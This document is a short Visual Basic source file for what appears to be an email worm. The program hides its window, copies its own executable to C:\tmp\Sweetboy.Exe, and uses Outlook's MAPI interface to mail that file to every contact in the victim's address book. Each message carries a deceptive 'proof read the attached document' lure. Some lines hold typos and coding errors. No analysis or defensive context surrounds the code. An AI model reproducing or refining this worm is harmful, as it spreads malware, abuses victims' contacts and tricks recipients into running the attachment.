Private Form Sub_Load()
Me.hide
Filcopy App.Path + "\" + App.EXEName + ".exe", "C:\tmp\Sweetboy.Exe"
Set so = CreateObject(fso)
Set ol = CreateObject("Outlook.Application")
Set out = Wscript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
Set a = mapi.AddressLists(1)
For X = 1 To a.AddressEntries.Count
Set Mail = ol.CreateItem(0)
Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
Mail.Subject = "Fwd:None"
Mail.Body = "Long time, no chat, buddy!  Could you proof read the attached document for me? Appreeesh"
Mail.Attachments.Add = "C:\tmp\Sweetboy.exe"
Mail.Send
Next
ol.Quit
End Sub
